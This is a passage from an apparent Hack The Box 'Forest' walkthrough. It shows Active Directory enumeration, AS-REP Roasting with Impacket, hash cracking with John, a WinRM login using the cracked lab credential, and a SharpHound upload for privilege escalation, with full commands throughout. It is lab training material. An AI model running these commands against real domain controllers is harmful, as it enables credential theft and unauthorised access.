&lt;p&gt;Next, we will use the &lt;em&gt;Nmap&lt;/em&gt; tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the scan takes too long to complete, we have this alternative:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below is an explanation of the parameters used in the port scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explanation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scans the entire range of ports (65535 in total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Shows all ports that are open (or possibly open)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more “noise” we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reports findings to the console&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;DNS resolution&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;TCP SYN&lt;/em&gt; scan&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Send packets no slower than &amp;lt;value&amp;gt; per second&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, to get more information in the console&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below is an explanation of the parameters used in the version and service scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explanation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Basic enumeration scripts&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Version and services running on the found ports&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Specify which ports we want to analyze (those found open in the previous step)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Based on the information reported by &lt;em&gt;Nmap&lt;/em&gt;, we can see that the target machine has open ports related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt; (53), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos authentication&lt;/code&gt; (88), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (135), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; (139), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; (389), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (445) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (5985). We can infer that we are dealing with a &lt;em&gt;Domain Controller (DC)&lt;/em&gt; and we are in an &lt;em&gt;Active Directory (AD)&lt;/em&gt; environment.&lt;/p&gt;

&lt;h3 id=&quot;exploitation-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Exploitation Phase&lt;/h3&gt;

&lt;p&gt;The first thing we’ll do is check if the machine has network-shared resources via a &lt;em&gt;null session&lt;/em&gt;, since we don’t have credentials; for this, we can use tools like &lt;em&gt;SMBMap&lt;/em&gt; or &lt;em&gt;smbclient&lt;/em&gt;. However, we won’t be able to list anything.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we can try to enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; protocol to obtain information about users, groups, or other objects in the environment. To do this, we will use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; tool.&lt;/p&gt;

&lt;p&gt;Our first goal will be to identify the &lt;em&gt;Naming Context&lt;/em&gt;, which is the &lt;em&gt;Distinguished Name (DN)&lt;/em&gt; that represents the highest level in the &lt;em&gt;Directory Information Tree (DIT)&lt;/em&gt; and will serve as the base for our queries. We will use the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;dn&lt;/em&gt; field is empty because we are querying the base object of the directory. The &lt;em&gt;namingContexts&lt;/em&gt; fields list the different &lt;em&gt;Naming Contexts&lt;/em&gt; of the &lt;em&gt;LDAP&lt;/em&gt; server. Each entry in &lt;em&gt;namingContexts&lt;/em&gt; represents a different part of the &lt;em&gt;LDAP&lt;/em&gt; directory that can be the base for various searches.&lt;/p&gt;

&lt;p&gt;We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC=htb,DC=local&lt;/code&gt; as the basis for our queries because this is the main &lt;em&gt;Naming Context&lt;/em&gt; representing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;htb.local&lt;/code&gt; domain, including users, groups, and other main objects. The other &lt;em&gt;Naming Contexts&lt;/em&gt; (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) are specific for configurations and schemas within the &lt;em&gt;AD&lt;/em&gt; environment.&lt;/p&gt;

&lt;p&gt;Once we obtain the &lt;em&gt;DN&lt;/em&gt;, we can start making specific queries, or we could list all the &lt;em&gt;LDAP&lt;/em&gt; information with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explanation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-x&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Simple authentication&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-h&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Host&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-s&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search scope&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-b&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Base DN for the search&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;We can start by searching for entries that contain the &lt;em&gt;user&lt;/em&gt; object class to list system users.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(objectClass=user)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;em&gt;sAMAccountName&lt;/em&gt; fields of each user, we will find their respective usernames. With a potential list of users at our disposal, we might consider an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; attack.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; attack exploits a weakness in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos&lt;/code&gt; authentication in &lt;em&gt;Active Directory&lt;/em&gt; environments. This attack begins by sending an &lt;em&gt;Authentication Server Request (AS-REQ)&lt;/em&gt; message to the &lt;em&gt;DC&lt;/em&gt; for users who are configured not to require &lt;em&gt;Kerberos&lt;/em&gt; pre-authentication. If the user’s account is configured this way, the &lt;em&gt;DC&lt;/em&gt; will respond with an &lt;em&gt;Authentication Server Response (AS-REP)&lt;/em&gt; message, which contains a &lt;em&gt;Ticket Granting Ticket (TGT)&lt;/em&gt; issued by the &lt;em&gt;Key Distribution Center (KDC)&lt;/em&gt;. This &lt;em&gt;TGT&lt;/em&gt; may be vulnerable to brute-force attacks if the password is weak, allowing us to crack the user’s password without having to perform a full authentication. This vulnerability is exploited because the server responds with an &lt;em&gt;AS-REP&lt;/em&gt; message instead of rejecting the request due to the lack of pre-authentication.&lt;/p&gt;

&lt;p&gt;With this in mind, instead of searching for users manually one by one, we can use a one-liner to filter and parse the users directly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can further refine the list of users obtained to focus exclusively on relevant accounts. The first two accounts, &lt;em&gt;DefaultAccount&lt;/em&gt; and &lt;em&gt;Guest&lt;/em&gt;, are created by the &lt;em&gt;AD&lt;/em&gt; itself (although &lt;em&gt;Guest&lt;/em&gt; is not enabled by default). Accounts ending in &lt;em&gt;$&lt;/em&gt; are &lt;em&gt;computer accounts&lt;/em&gt;, while the &lt;em&gt;$331000-VK4ADACQNUCA&lt;/em&gt; account has an unusual format and could be a special service account or automatically generated. Accounts starting with &lt;em&gt;SM_&lt;/em&gt; and &lt;em&gt;HealthMailbox&lt;/em&gt; are related to the &lt;em&gt;Microsoft Exchange&lt;/em&gt; service. This leaves us with five potential users for our analysis.&lt;/p&gt;

&lt;p&gt;The next thing we’ll do is use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers&lt;/code&gt; script from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; suite. To run it, we need to provide the &lt;em&gt;AD&lt;/em&gt; domain name we want to target. To set this up, we will edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file to ensure that the domain name resolves to the corresponding IP address of the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this done, the command we will use is the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers htb.local/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-userfile&lt;/span&gt; userListFile  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interestingly, none of the users we obtained seem to be vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;. Therefore, we will proceed to enumerate another protocol identified during our &lt;em&gt;Nmap&lt;/em&gt; scan, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt;, again using a &lt;em&gt;null session&lt;/em&gt;, as we don’t have credentials. We verify that we can connect successfully, so we will proceed to enumerate additional information. We could list domain groups using &lt;em&gt;enumdomgroup&lt;/em&gt; or, alternatively, list domain users again using &lt;em&gt;enumdomusers&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We observe three new users that we hadn’t detected when enumerating with &lt;em&gt;ldapsearch&lt;/em&gt;. We’re interested in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;, as both Administrator and krbtgt are created by the &lt;em&gt;AD&lt;/em&gt; itself.&lt;/p&gt;

&lt;p&gt;If we recall, when we used &lt;em&gt;ldapsearch&lt;/em&gt;, we filtered for users whose object class contained &lt;em&gt;user&lt;/em&gt;, and the five users we previously found meet this condition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, upon further investigation, we discover that this “user” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; does not have a defined object class. This is likely because it belongs to the &lt;em&gt;Organizational Unit (OU)&lt;/em&gt; of Service Accounts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once again, by using a one-liner, we could filter and parse the users, refine the list, and use it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; to check if this new user is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;, and we obtain a hash that we will attempt to crack by brute force using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; along with the &lt;a href=&quot;https://github.com/brannondorsey/naive-hashcat/releases/tag/data&quot;&gt;rockyou.txt&lt;/a&gt; dictionary.&lt;/p&gt;

&lt;p&gt;If we don’t have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; installed, we can do the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;john
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/to/rockyou.txt/dictionary/ &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we obtain the password for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; user, we can validate the credential before attempting to connect to the target machine to ensure it is correct. Recall that during our &lt;em&gt;Nmap&lt;/em&gt; scan, we observed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (&lt;em&gt;Windows Remote Management&lt;/em&gt;) service is active on the target machine; this will be the protocol we will use for the connection.&lt;/p&gt;

&lt;p&gt;To validate the credential, we will use &lt;em&gt;CrackMapExec&lt;/em&gt; with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We realize that the credential is not only valid, but also that this user belongs to the &lt;em&gt;Remote Management Users&lt;/em&gt; group,  as we see a message next to the username saying &lt;em&gt;Pwn3d!&lt;/em&gt;. Therefore, we can connect to the target machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will proceed to connect as follows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;Once inside the target machine, we can start gathering information from the &lt;em&gt;Active Directory&lt;/em&gt; to allow us to escalate privileges. To do this, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt;, a data collector for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;, a tool that allows us to analyze and visualize relationships and permissions within an &lt;em&gt;Active Directory&lt;/em&gt; environment to identify potential privilege escalation paths.&lt;/p&gt;

&lt;p&gt;The first thing we will do is download &lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound&lt;/a&gt; to our machine. One convenient feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; is that it allows us to easily upload and download files. To upload the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound.ps1&lt;/code&gt; file to the target machine, we execute the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload SharpHound.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once uploaded, we will import and use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-BloodHound&lt;/code&gt; function to collect all the necessary information.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\SharpHound.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-BloodHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will generate a compressed file containing all the &lt;em&gt;AD&lt;/em&gt; information. To download this file to our machine, we use the following command:&lt;/p&gt;

